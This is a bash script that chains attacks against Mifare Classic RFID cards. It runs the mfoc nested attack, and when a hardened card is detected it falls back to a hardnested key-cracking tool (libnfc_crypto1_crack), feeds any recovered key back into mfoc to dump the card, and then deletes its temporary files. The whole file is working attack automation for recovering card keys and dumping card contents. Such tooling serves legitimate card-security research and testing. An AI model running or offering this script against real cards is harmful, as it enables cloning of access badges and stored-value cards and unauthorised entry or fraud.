#!/bin/bash

mfoc -O /tmp/asdf1234zxcvqwerlkjh0978.mfd
mfocResult=$?
prngNotVulnerable=9
keepTrying=1
foundKeysForMFOC=" "

while [ $keepTrying -eq 1 ]
do
#echo "MFOC result: $mfocResult"
if [ "$mfocResult" == "$prngNotVulnerable" ];then
	echo "MFOC not possible, detected hardened Mifare Classic"
        if [ "$mfocResult" -eq 9 ];then
                FILENAME="/tmp/unknownMfocSectorInfo_123456asdfqwer.txt"
		count=0
		while read LINE
		do
		let count++
		#echo "$count $LINE"
		done < $FILENAME

                arr=(`echo $LINE | tr ';' ' '`)
                #echo ${arr[0]}
                #echo ${arr[1]}
                #echo ${arr[2]}
                #echo ${arr[3]}
                #echo ${arr[4]}

 		knownKey=${arr[0]}
		knownSectorNum=${arr[1]}
		knownKeyLetter=${arr[2]}
		unknownSectorNum=${arr[3]}
		unknownKeyLetter=${arr[4]}
 		knownBlockNum=$(($knownSectorNum * 4))
 		unknownBlockNum=$(($unknownSectorNum * 4))
		echo "Trying HardNested Attack..."
		mycmd=(libnfc_crypto1_crack "$knownKey" "$knownBlockNum" "$knownKeyLetter" "$unknownBlockNum" "$unknownKeyLetter")
                echo "${mycmd[@]}"
                "${mycmd[@]}"
        else
                echo "mfoc returned: $mfocResult"
                keepTrying=0
	fi

        cryptoCrackResult=$?
        if [ "$cryptoCrackResult" -eq 0 ];then
                FILENAME="/tmp/foundKey_Crapto1_Libnfc_1234567890qwerasdf.txt"
                while read LINE
                do
                echo "$LINE"
                done < $FILENAME 

                #arr=(`echo $LINE | tr ';' ' '`)
                #echo ${arr[0]}
                #echo ${arr[1]}
                #echo ${arr[2]}
                #foundKeysForMFOC="$foundKeysForMFOC-k ${arr[0]} "
		mycmd=(mfoc -f "$FILENAME" -O /tmp/asdf1234zxcvqwerlkjh0978.mfd)
                echo "${mycmd[@]}"
                "${mycmd[@]}"
                mfocResult=$?
        fi
else
	keepTrying=0
fi
done

rm -rf /tmp/asdf1234zxcvqwerlkjh0978.mfd
rm -rf /tmp/foundKey_Crapto1_Libnfc_1234567890qwerasdf.txt
rm -rf /tmp/unknownMfocSectorInfo_123456asdfqwer.txt
